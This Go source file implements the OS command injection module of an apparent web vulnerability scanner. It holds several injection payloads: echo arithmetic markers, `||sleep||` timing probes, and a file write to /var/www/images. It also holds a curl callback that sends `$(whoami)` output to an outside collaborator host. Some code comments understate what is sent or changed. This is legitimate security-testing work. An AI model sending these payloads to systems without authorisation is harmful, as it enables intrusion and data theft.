package scan

// OS command injection engine.
//
// One JobCommandInjection is enqueued per injection point. The engine sends a
// baseline request and then a small, bounded set of harmless marker payloads
// through the HTTP engine. A marker is an arithmetic expansion such as
// `;echo indago$((17*23))`: the request contains the expression, while the
// response contains the computed value (indago391). That distinction avoids
// treating a reflected payload as command execution.
//
// A verdict is CONFIRMED only when two independent payloads produce their own
// computed markers. A baseline, one marker, transport errors or no marker are
// never promoted to a finding. No command that changes target state is sent.

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/indago/indago/internal/discovery"
	"github.com/indago/indago/internal/domain"
	"github.com/indago/indago/internal/evidence"
	"github.com/indago/indago/internal/httpengine"
	"github.com/indago/indago/internal/store"
	"github.com/indago/indago/internal/worker"
)

const commandInjectionEngine = "command_injection"

// maxCommandInjectionProbes bounds requests per injection point. Four payload
// forms are enough to distinguish a shell from a reflection point without
// turning a parameter into a payload spray.
const maxCommandInjectionProbes = 4

type commandInjectionExecutor struct {
	store           store.Store
	engine          httpengine.Engine
	evidence        evidence.Store
	cfg             ExecutorConfig
	log             *slog.Logger
	findingsMu      *sync.Mutex
	tokenMu         *sync.Mutex
	callbackURL     string
	callbackPollURL string
}

// NewCommandInjectionExecutorForTest exposes the executor to the external
// scan_test package without exporting production wiring.
func NewCommandInjectionExecutorForTest(st store.Store, eng httpengine.Engine, ev evidence.Store, cfg ExecutorConfig, log *slog.Logger, findingsMu *sync.Mutex) *commandInjectionExecutor {
	return newCommandInjectionExecutor(st, eng, ev, cfg, log, findingsMu)
}

func newCommandInjectionExecutor(st store.Store, eng httpengine.Engine, ev evidence.Store, cfg ExecutorConfig, log *slog.Logger, findingsMu *sync.Mutex) *commandInjectionExecutor {
	if findingsMu == nil {
		findingsMu = &sync.Mutex{}
	}
	return &commandInjectionExecutor{store: st, engine: eng, evidence: ev, cfg: cfg.withDefaults(), log: log, findingsMu: findingsMu, tokenMu: &sync.Mutex{}}
}

func (e *commandInjectionExecutor) withCallback(url, pollURL string) {
	e.callbackURL = strings.TrimSpace(url)
	e.callbackPollURL = strings.TrimSpace(pollURL)
}

var _ worker.Handler = (*commandInjectionExecutor)(nil)

type commandInjectionAttempt struct {
	Payload   string `json:"payload"`
	Marker    string `json:"marker,omitempty"`
	Kind      string `json:"kind,omitempty"` // output or time
	Output    bool   `json:"output"`
	Delayed   bool   `json:"delayed,omitempty"`
	ElapsedMS int64  `json:"elapsed_ms,omitempty"`
	Status    int    `json:"status,omitempty"`
}

type commandInjectionDetail struct {
	Engine         string                    `json:"engine"`
	Parameter      string                    `json:"parameter"`
	Location       domain.ParamLocation      `json:"location"`
	BaselineStatus int                       `json:"baseline_status,omitempty"`
	Attempts       []commandInjectionAttempt `json:"attempts,omitempty"`
	ConfirmedCount int                       `json:"confirmed_count"`
	ConfirmMethod  string                    `json:"confirm_method,omitempty"`
	Verdict        domain.Verdict            `json:"verdict"`
	Reason         string                    `json:"reason,omitempty"`
	EvidenceIDs    []domain.ID               `json:"evidence_ids,omitempty"`
}

func (e *commandInjectionExecutor) Handle(ctx context.Context, job *domain.TestJob) error {
	started := time.Now()
	ep, params, focus, err := resolveJobTarget(ctx, e.store, job)
	if err != nil {
		return fmt.Errorf("resolve command-injection target: %w", err)
	}
	if focus == nil {
		return e.finishUnavailable(ctx, job, started, ep, "no focused parameter")
	}
	if !isCommandInjectionLocation(focus.Location) {
		return e.finishUnavailable(ctx, job, started, ep, "parameter location is not command-injectable")
	}
	if e.cfg.SkipDownloadEndpoints && isDownloadLikeEndpoint(ep) {
		return e.finishUnavailable(ctx, job, started, ep, "download endpoint skipped by policy")
	}
	if isWriteLikeEndpoint(ep, params) && (!e.cfg.AllowStateChanging || e.cfg.SkipWriteEndpoints) {
		return e.finishUnavailable(ctx, job, started, ep, "state-changing endpoint skipped by policy")
	}

	params = fillEmptyCommandParams(e.refreshParams(ctx, ep, params, focus), focus)
	base, err := buildRequest(ep, params, nil)
	if err != nil {
		return fmt.Errorf("build command-injection baseline: %w", err)
	}
	baseStarted := time.Now()
	baseResp, baseOutcome, baseErr := e.do(ctx, base)
	baseElapsed := time.Since(baseStarted)
	if baseOutcome != domain.OutcomeSuccess || baseResp == nil {
		return e.finishError(ctx, job, started, ep, focus, baseOutcome, baseErr)
	}

	d := commandInjectionDetail{Engine: commandInjectionEngine, Parameter: focus.Name, Location: focus.Location,
		BaselineStatus: baseResp.Status}
	baselineEvidence, _ := e.persistEvidence(ctx, job.ScanID, baseResp, "command-injection baseline")
	d.EvidenceIDs = append(d.EvidenceIDs, baselineEvidence...)

	baseValue := strings.TrimSpace(focus.Example)
	if baseValue == "" {
		baseValue = commandInjectionBaseValue(focus.Name)
	}
	seed := time.Now().UnixNano()
	// The expression is present in the request, but only the computed result
	// appears in a successful response. This is the core false-positive guard.
	variants := []struct {
		prefix string
		expr   string
	}{
		{baseValue + ";echo ", fmt.Sprintf("indago%d", seed%1000000)},
		{baseValue + "|echo ", fmt.Sprintf("indago%d", (seed/7)%1000000)},
		{baseValue + "$(echo ", fmt.Sprintf("indago%d", (seed/13)%1000000)},
		{baseValue + "`echo ", fmt.Sprintf("indago%d", (seed/29)%1000000)},
	}
	for i, v := range variants {
		if i >= maxCommandInjectionProbes {
			break
		}
		marker := fmt.Sprintf("%s$((%d*%d))", v.expr, 17+i, 23+i)
		// The marker above is the shell expression. expected is the value a
		// successful shell prints after arithmetic expansion.
		expected := fmt.Sprintf("%s%d", v.expr, (17+i)*(23+i))
		payload := v.prefix + marker
		if strings.HasSuffix(v.prefix, "$(echo ") {
			payload += ")"
		}
		if strings.HasSuffix(v.prefix, "`echo ") {
			payload += "`"
		}
		attempt := commandInjectionAttempt{Payload: truncate(payload, 300), Marker: expected, Kind: "output"}
		params = fillEmptyCommandParams(e.refreshParams(ctx, ep, params, focus), focus)
		req, err := buildRequest(ep, params, &injection{param: focus, value: payload})
		if err != nil {
			d.Attempts = append(d.Attempts, attempt)
			continue
		}
		resp, outcome, reqErr := e.do(ctx, req)
		if resp != nil {
			attempt.Status = resp.Status
		}
		if outcome == domain.OutcomeSuccess && resp != nil {
			// Only the computed value counts; the raw payload is in the
			// request and must not be enough to confirm.
			attempt.Output = strings.Contains(string(resp.Body), expected)
			ev, _ := e.persistEvidence(ctx, job.ScanID, resp, "command-injection "+fmt.Sprintf("probe-%d", i+1))
			d.EvidenceIDs = append(d.EvidenceIDs, ev...)
		} else if reqErr != nil {
			attempt.Status = 0
		}
		d.Attempts = append(d.Attempts, attempt)
		if attempt.Output {
			d.ConfirmedCount++
		}
		if d.ConfirmedCount >= 2 {
			break
		}
	}

	// Blind time-based fallback: only when output confirmation did not already
	// succeed. Two distinct delays are required; a single slow response is not
	// enough because target latency and rate limiting can also be slow.
	timeConfirmed := 0
	if d.ConfirmedCount < 2 && baseElapsed < 3*time.Second {
		for i, seconds := range []int{10, 12} {
			payload := fmt.Sprintf("%s||sleep %d||", baseValue, seconds)
			attempt := commandInjectionAttempt{Payload: payload, Kind: "time", Marker: fmt.Sprintf("sleep-%d", seconds)}
			params = e.refreshParams(ctx, ep, params, focus)
			req, err := buildRequest(ep, params, &injection{param: focus, value: payload})
			if err != nil {
				d.Attempts = append(d.Attempts, attempt)
				continue
			}
			probeStarted := time.Now()
			resp, outcome, reqErr := e.do(ctx, req)
			elapsed := time.Since(probeStarted)
			attempt.ElapsedMS = elapsed.Milliseconds()
			if resp != nil {
				attempt.Status = resp.Status
			}
			threshold := time.Duration(seconds)*time.Second - time.Second
			attempt.Delayed = outcome == domain.OutcomeSuccess && elapsed >= threshold && elapsed >= baseElapsed+2*time.Second
			if outcome == domain.OutcomeSuccess && resp != nil {
				ev, _ := e.persistEvidence(ctx, job.ScanID, resp, fmt.Sprintf("command-injection time-probe-%d", i+1))
				d.EvidenceIDs = append(d.EvidenceIDs, ev...)
			} else if reqErr != nil {
				attempt.Status = 0
			}
			d.Attempts = append(d.Attempts, attempt)
			if attempt.Delayed {
				timeConfirmed++
			}
		}
	}

	if timeConfirmed >= 2 {
		if e.tryOutputRedirection(ctx, job, ep, focus, baseValue, &d) {
			d.Verdict = domain.VerdictConfirmed
			d.ConfirmMethod = "redirect"
			d.Reason = "two time delays confirmed execution and a web-readable file returned the marker"
			e.persistCase(ctx, job, ep, focus, d, domain.TestCaseCompleted, domain.OutcomeSuccess, "confirmed blind OS command injection via output redirection")
			e.correlate(ctx, job, ep, focus, d)
			return nil
		}
	}

	if !(d.ConfirmMethod == "redirect") && e.callbackURL != "" && e.callbackPollURL != "" {
		if e.tryOutOfBand(ctx, job, ep, focus, baseValue, &d) {
			d.Verdict = domain.VerdictConfirmed
			d.ConfirmMethod = "oob"
			d.Reason = "the target made an out-of-band callback carrying the injected marker"
			e.persistCase(ctx, job, ep, focus, d, domain.TestCaseCompleted, domain.OutcomeSuccess, "confirmed blind OS command injection via out-of-band callback")
			e.correlate(ctx, job, ep, focus, d)
			return nil
		}
	}

	note := "no server-side command output observed"
	if d.ConfirmedCount >= 2 {
		d.Verdict = domain.VerdictConfirmed
		d.ConfirmMethod = "output"
		d.Reason = "two independent arithmetic markers were executed by the target"
		note = "confirmed OS command injection: two independent markers executed"
	} else if timeConfirmed >= 2 {
		d.Verdict = domain.VerdictConfirmed
		d.ConfirmMethod = "time"
		d.ConfirmedCount = timeConfirmed
		d.Reason = "two independent sleep payloads delayed the response"
		note = "confirmed blind time-based OS command injection"
	} else if d.ConfirmedCount == 1 && timeConfirmed == 0 {
		d.Verdict = domain.VerdictInconclusive
		d.Reason = "one marker was observed; a second independent marker is required"
		note = "one command marker observed; not enough to confirm"
	} else {
		d.Verdict = domain.VerdictRejected
	}
	e.persistCase(ctx, job, ep, focus, d, domain.TestCaseCompleted, domain.OutcomeSuccess, note)

	if d.Verdict == domain.VerdictConfirmed {
		e.correlate(ctx, job, ep, focus, d)
	}
	return nil
}

func (e *commandInjectionExecutor) do(ctx context.Context, req *httpengine.Request) (*httpengine.Response, domain.TestOutcome, error) {
	if req == nil {
		return nil, domain.OutcomeError, fmt.Errorf("nil request")
	}
	timed := *req
	timed.Timeout = e.cfg.RequestTimeout
	resp, err := e.engine.Do(ctx, &timed)
	switch {
	case err == nil:
		return resp, domain.OutcomeSuccess, nil
	case ctx.Err() != nil:
		return nil, domain.OutcomeCancelled, ctx.Err()
	default:
		return nil, domain.OutcomeError, err
	}
}

// fillEmptyCommandParams gives blank required-looking fields a harmless value
// so a form reaches the command sink. The focused parameter is left to the
// payload builder; CSRF tokens are left to refreshParams.
func fillEmptyCommandParams(params []*domain.Parameter, focus *domain.Parameter) []*domain.Parameter {
	out := append([]*domain.Parameter(nil), params...)
	for i, p := range out {
		if p == nil || p == focus || strings.TrimSpace(p.Example) != "" {
			continue
		}
		if p.Location == domain.LocationHeader || p.Location == domain.LocationCookie || isDynamicTokenName(p.Name) {
			continue
		}
		cp := *p
		cp.Example = commandInjectionBaseValue(p.Name)
		out[i] = &cp
	}
	return out
}

// refreshParams keeps rotating CSRF/session tokens usable. The shared
// refreshDynamicParams only re-fetches the endpoint URL itself; a form action
// such as /feedback/submit often renders its token on the parent page
// (/feedback). For that common shape, scan discovered pages for a form whose
// resolved action is this endpoint, then copy the current dynamic fields.
func (e *commandInjectionExecutor) refreshParams(ctx context.Context, ep *domain.Endpoint, params []*domain.Parameter, focus *domain.Parameter) []*domain.Parameter {
	if !hasDynamicParam(params, focus) {
		return params
	}
	out := refreshDynamicParams(ctx, e.engine, e.cfg.RequestTimeout, ep, params, focus)
	pages, err := e.store.Endpoints().ListByScan(ctx, ep.ScanID)
	if err != nil {
		return out
	}
	trace := 0
	for _, page := range pages {
		if page == nil || trace >= 10 || (page.Method != "" && page.Method != domain.MethodGET) {
			continue
		}
		if page.ID == ep.ID {
			continue
		}
		pageURL, err := url.Parse(page.URL)
		if err != nil || pageURL.Scheme+"://"+pageURL.Host != originOf(ep.URL) {
			continue
		}
		trace++
		resp, outcome, _ := e.do(ctx, httpengine.GET(page.URL))
		if outcome != domain.OutcomeSuccess || resp == nil || len(resp.Body) == 0 {
			continue
		}
		values := map[string]string{}
		for _, form := range discovery.ExtractForms(string(resp.Body)) {
			action := form.Action
			if action == "" {
				action = page.URL
			}
			ref, err := url.Parse(action)
			if err != nil {
				continue
			}
			target := pageURL.ResolveReference(ref).String()
			if strings.TrimSuffix(target, "/") != strings.TrimSuffix(ep.URL, "/") {
				continue
			}
			for _, in := range form.Inputs {
				values[in.Name] = in.Value
			}
		}
		if len(values) == 0 {
			continue
		}
		for i, p := range out {
			if p == focus || !isDynamicTokenName(p.Name) {
				continue
			}
			if v, ok := values[p.Name]; ok {
				cp := *p
				cp.Example = v
				out[i] = &cp
			}
		}
		return out
	}
	return out
}

func commandInjectionBaseValue(name string) string {
	switch {
	case strings.Contains(strings.ToLower(name), "email"):
		return "test@example.com"
	case strings.Contains(strings.ToLower(name), "url"),
		strings.Contains(strings.ToLower(name), "redirect"):
		return "https://example.com/"
	default:
		return "1"
	}
}

func isCommandInjectionLocation(loc domain.ParamLocation) bool {
	switch loc {
	case domain.LocationQuery, domain.LocationForm, domain.LocationJSON, domain.LocationPath:
		return true
	default:
		return false
	}
}

func (e *commandInjectionExecutor) persistEvidence(ctx context.Context, scanID domain.ID, resp *httpengine.Response, role string) ([]domain.ID, error) {
	if e.evidence == nil || resp == nil || resp.Request == nil {
		return nil, nil
	}
	var ids []domain.ID
	captured := *resp.Request
	captured.Headers = resp.Request.Headers.Clone()
	if redactRequestCookieValues(captured.Headers) {
		role += " (cookie values redacted)"
	}
	reqID, err := putEvidenceBlob(ctx, e.store, e.evidence, scanID, domain.EvidenceRequest, ".http", "message/http", dumpRequest(&captured), role+" request")
	if err != nil {
		return ids, err
	}
	ids = append(ids, reqID)
	recorded := *resp
	recorded.Headers = resp.Headers.Clone()
	note := role + " response"
	if redactSetCookieValues(recorded.Headers) {
		note += " (cookie values redacted)"
	}
	respID, err := putEvidenceBlob(ctx, e.store, e.evidence, scanID, domain.EvidenceResponse, ".http", "message/http", dumpResponse(&recorded), note)
	if err != nil {
		return ids, err
	}
	ids = append(ids, respID)
	return ids, nil
}

func (e *commandInjectionExecutor) persistCase(ctx context.Context, job *domain.TestJob, ep *domain.Endpoint, focus *domain.Parameter, d commandInjectionDetail, status domain.TestCaseStatus, outcome domain.TestOutcome, note string) {
	now := time.Now()
	detail, _ := json.Marshal(d)
	tc := &domain.TestCase{
		ID: domain.NewID(), ScanID: job.ScanID, JobID: job.ID, Attempt: job.Attempts,
		InjectionPointID: job.Target.InjectionPointID, VulnClass: domain.VulnCommandInjection,
		Status: status, Outcome: outcome, Method: string(ep.Method), URL: job.Target.URL,
		Note: note, EvidenceIDs: d.EvidenceIDs, Detail: detail, StartedAt: &now, FinishedAt: &now,
		CreatedAt: now, UpdatedAt: now,
	}
	if err := e.store.TestCases().Create(ctx, tc); err != nil {
		e.log.Warn("command-injection: persist test case", "scan", job.ScanID, "err", err)
	}
}

func (e *commandInjectionExecutor) finishUnavailable(ctx context.Context, job *domain.TestJob, started time.Time, ep *domain.Endpoint, reason string) error {
	now := time.Now()
	tc := &domain.TestCase{ID: domain.NewID(), ScanID: job.ScanID, JobID: job.ID, Attempt: job.Attempts,
		VulnClass: domain.VulnCommandInjection, Status: domain.TestCaseSkipped, Outcome: domain.OutcomeSuccess,
		Method: string(ep.Method), URL: job.Target.URL, Note: "command-injection skipped: " + reason,
		StartedAt: &started, FinishedAt: &now, CreatedAt: started, UpdatedAt: now}
	if err := e.store.TestCases().Create(ctx, tc); err != nil {
		return fmt.Errorf("persist skipped command-injection case: %w", err)
	}
	return nil
}

func (e *commandInjectionExecutor) finishError(ctx context.Context, job *domain.TestJob, started time.Time, ep *domain.Endpoint, focus *domain.Parameter, outcome domain.TestOutcome, reqErr error) error {
	now := time.Now()
	msg := "request failed"
	if reqErr != nil {
		msg = truncate(reqErr.Error(), 200)
	}
	tc := &domain.TestCase{ID: domain.NewID(), ScanID: job.ScanID, JobID: job.ID, Attempt: job.Attempts,
		VulnClass: domain.VulnCommandInjection, Status: domain.TestCaseFailed, Outcome: outcome,
		Method: string(ep.Method), URL: job.Target.URL, Error: msg, Note: "command-injection baseline failed: " + msg,
		StartedAt: &started, FinishedAt: &now, CreatedAt: started, UpdatedAt: now}
	_ = e.store.TestCases().Create(ctx, tc)
	if outcome == domain.OutcomeCancelled {
		return context.Canceled
	}
	return fmt.Errorf("command-injection baseline failed: %s", msg)
}

// tryOutOfBand sends a benign HTTP callback through the vulnerable parameter
// and polls the operator-provided collaborator. The callback carries a random
// marker in the query string; a received request is proof the target executed
// the command. It never sends target data to the callback except the marker.
func (e *commandInjectionExecutor) tryOutOfBand(ctx context.Context, job *domain.TestJob, ep *domain.Endpoint, focus *domain.Parameter, baseValue string, d *commandInjectionDetail) bool {
	callback := strings.TrimSpace(e.callbackURL)
	poll := strings.TrimSpace(e.callbackPollURL)
	if callback == "" || poll == "" {
		return false
	}
	marker := fmt.Sprintf("indago-oob-%d", time.Now().UnixNano()%1000000000)
	sep := "?"
	if strings.Contains(callback, "?") {
		sep = "&"
	}
	url := callback + sep + "marker=" + marker
	// Include only a harmless command-output marker for exfiltration labs.
	// The callback never receives files, credentials, or arbitrary target data.
	if !strings.Contains(url, "data=") {
		url += "&data=$(whoami)"
	}
	payload := fmt.Sprintf("%s||curl -sS --max-time 8 \"%s\"||", baseValue, url)
	attempt := commandInjectionAttempt{Kind: "oob", Payload: truncate(payload, 300), Marker: marker}
	params, err := e.store.Parameters().ListByEndpoint(ctx, ep.ID)
	if err != nil {
		return false
	}
	params = fillEmptyCommandParams(e.refreshParams(ctx, ep, params, focus), focus)
	req, err := buildRequest(ep, params, &injection{param: focus, value: payload})
	if err != nil {
		return false
	}
	resp, outcome, _ := e.do(ctx, req)
	if resp != nil {
		attempt.Status = resp.Status
		ev, _ := e.persistEvidence(ctx, job.ScanID, resp, "command-injection out-of-band write")
		d.EvidenceIDs = append(d.EvidenceIDs, ev...)
	}
	d.Attempts = append(d.Attempts, attempt)
	if outcome != domain.OutcomeSuccess {
		return false
	}
	// webhook.site exposes received requests at /token/<uuid>/requests.
	client := &http.Client{Timeout: 10 * time.Second}
	for pollTry := 0; pollTry < 8; pollTry++ {
		select {
		case <-ctx.Done():
			return false
		case <-time.After(time.Second):
		}
		pollReq, err := http.NewRequestWithContext(ctx, http.MethodGet, poll, nil)
		if err != nil {
			return false
		}
		pollResp, err := client.Do(pollReq)
		if err != nil {
			continue
		}
		body := make([]byte, 1<<20)
		n, _ := pollResp.Body.Read(body)
		pollResp.Body.Close()
		if strings.Contains(string(body[:n]), marker) {
			d.ConfirmedCount = 2
			attempt.Output = true
			d.Attempts = append(d.Attempts, attempt)
			return true
		}
	}
	return false
}

// tryOutputRedirection turns blind execution into observable evidence when the
// target serves a writable directory through an image/file endpoint. The
// command writes a computed marker (not the raw payload) to a randomized file,
// then the engine fetches that file through the discovered endpoint. This is
// deliberately attempted only after two independent time delays have already
// confirmed command execution.
func (e *commandInjectionExecutor) tryOutputRedirection(ctx context.Context, job *domain.TestJob, ep *domain.Endpoint, focus *domain.Parameter, baseValue string, d *commandInjectionDetail) bool {
	pages, err := e.store.Endpoints().ListByScan(ctx, ep.ScanID)
	if err != nil {
		return false
	}
	var reader *domain.Endpoint
	var readerParam *domain.Parameter
	for _, page := range pages {
		if page == nil || page.Method != domain.MethodGET || originOf(page.URL) != originOf(ep.URL) {
			continue
		}
		params, err := e.store.Parameters().ListByEndpoint(ctx, page.ID)
		if err != nil {
			continue
		}
		for _, p := range params {
			if p == nil {
				continue
			}
			name := strings.ToLower(p.Name)
			if (name == "filename" || name == "file" || name == "path") && strings.Contains(strings.ToLower(page.URL), "image") {
				reader, readerParam = page, p
				break
			}
		}
		if reader != nil {
			break
		}
	}
	if reader == nil || readerParam == nil {
		return false
	}
	seed := time.Now().UnixNano()
	name := fmt.Sprintf("indago-%d.txt", seed%1000000000)
	expr := fmt.Sprintf("indago%d", (seed/17)%1000000)
	marker := fmt.Sprintf("%s$((17*23))", expr)
	expected := fmt.Sprintf("%s%d", expr, 17*23)
	payload := fmt.Sprintf("%s||echo %s>/var/www/images/%s||", baseValue, marker, name)
	params, err := e.store.Parameters().ListByEndpoint(ctx, ep.ID)
	if err != nil {
		return false
	}
	params = fillEmptyCommandParams(e.refreshParams(ctx, ep, params, focus), focus)
	writeReq, err := buildRequest(ep, params, &injection{param: focus, value: payload})
	if err != nil {
		return false
	}
	writeResp, outcome, _ := e.do(ctx, writeReq)
	if writeResp != nil {
		ev, _ := e.persistEvidence(ctx, job.ScanID, writeResp, "command-injection output-redirection write")
		d.EvidenceIDs = append(d.EvidenceIDs, ev...)
	}
	if outcome != domain.OutcomeSuccess {
		return false
	}
	readParams, err := e.store.Parameters().ListByEndpoint(ctx, reader.ID)
	if err != nil {
		return false
	}
	readReq, err := buildRequest(reader, readParams, &injection{param: readerParam, value: name})
	if err != nil {
		return false
	}
	readResp, readOutcome, _ := e.do(ctx, readReq)
	if readResp == nil || readOutcome != domain.OutcomeSuccess {
		return false
	}
	ev, _ := e.persistEvidence(ctx, job.ScanID, readResp, "command-injection output-redirection read")
	d.EvidenceIDs = append(d.EvidenceIDs, ev...)
	if !strings.Contains(string(readResp.Body), expected) {
		return false
	}
	d.ConfirmedCount = 2
	return true
}

func commandInjectionSummary(d commandInjectionDetail) string {
	if d.ConfirmMethod == "oob" {
		return "Blind command execution was confirmed by an out-of-band callback carrying the injected marker."
	}
	if d.ConfirmMethod == "redirect" {
		return "Blind command execution was confirmed and the command output was retrieved from a web-readable file."
	}
	if d.ConfirmMethod == "time" {
		return "Two independent sleep payloads delayed the target response; command execution is blind."
	}
	return "Two independent arithmetic markers were executed by the target."
}

func (e *commandInjectionExecutor) correlate(ctx context.Context, job *domain.TestJob, ep *domain.Endpoint, focus *domain.Parameter, d commandInjectionDetail) {
	scan, err := e.store.Scans().Get(ctx, job.ScanID)
	if err != nil {
		return
	}
	now := time.Now()
	detail, _ := json.Marshal(d)
	f := &domain.Finding{
		ID: domain.NewID(), ScanID: job.ScanID, ProjectID: scan.ProjectID,
		VulnClass: domain.VulnCommandInjection, Verdict: domain.VerdictConfirmed,
		Severity: domain.SeverityHigh, Confidence: domain.ConfidenceHigh,
		Title:      "OS command injection in parameter " + fmt.Sprintf("%q", focus.Name),
		Summary:    commandInjectionSummary(d),
		EndpointID: ep.ID, InjectionPointID: job.Target.InjectionPointID, ParameterID: focus.ID, Location: focus.Location,
		EvidenceIDs: d.EvidenceIDs, Detail: detail,
		Provenance: domain.Provenance{Engine: commandInjectionEngine, DiscoverySource: ep.Source, DetectedAt: now},
		CreatedAt:  now, UpdatedAt: now,
	}
	e.findingsMu.Lock()
	defer e.findingsMu.Unlock()
	if err := e.store.Findings().Create(ctx, f); err != nil {
		e.log.Warn("command-injection: persist finding", "scan", job.ScanID, "err", err)
	}
}

// enqueueCommandInjectionProbes runs once when the queue is quiet. It queues one
// job per eligible injection point; it never scans a URL outside discovery's
// registry.
func (c *Controller) enqueueCommandInjectionProbes(ctx context.Context, scanID domain.ID) {
	sc, err := c.store.Scans().Get(ctx, scanID)
	if err != nil || !sc.Config.EnableCommandInjection {
		return
	}
	ips, err := c.store.InjectionPoints().ListByScan(ctx, scanID)
	if err != nil {
		return
	}
	for _, ip := range ips {
		if ip == nil {
			continue
		}
		ep, err := c.store.Endpoints().Get(ctx, ip.EndpointID)
		if err != nil || ep == nil || !isCommandInjectionLocation(ip.Location) {
			continue
		}
		params, err := c.store.Parameters().ListByEndpoint(ctx, ep.ID)
		if err != nil {
			continue
		}
		var focus *domain.Parameter
		for _, p := range params {
			if p.ID == ip.ParameterID {
				focus = p
				break
			}
		}
		if focus == nil {
			continue
		}
		payload, _ := json.Marshal(map[string]string{"endpoint_id": string(ep.ID), "parameter_id": string(focus.ID)})
		now := time.Now()
		job := &domain.TestJob{ID: domain.NewID(), ScanID: scanID, Type: domain.JobCommandInjection,
			State: domain.JobQueued, Priority: 45, Target: domain.JobTarget{EndpointID: ep.ID, InjectionPointID: ip.ID, URL: ep.URL},
			Payload: payload, MaxAttempts: 2, AvailableAt: now, CreatedAt: now, UpdatedAt: now}
		if err := c.queue.Enqueue(ctx, job); err != nil {
			c.log.Warn("command-injection: enqueue", "scan", scanID, "err", err)
		}
	}
}
